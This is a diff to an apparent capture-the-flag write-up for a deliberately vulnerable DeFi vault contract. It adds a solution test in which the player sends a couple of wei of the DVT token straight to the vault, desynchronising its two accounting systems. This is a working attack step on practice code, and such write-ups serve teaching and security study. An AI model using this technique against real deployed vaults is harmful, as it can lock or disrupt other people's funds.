@@ -37,6 +37,13 @@ The totalAssets function is overridden to always return the balance of the vault
 Attack Strategy:
 
 The attack involves creating a conflict between the two accounting systems by manually transferring 'DVT' to the vault.
+```solidity
+it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        // Sending just 2 Wei, although even 1 Wei should be enough
+        await token.connect(player).transfer(vault.address, 2);
+    });
+```
 
 ## Help
 
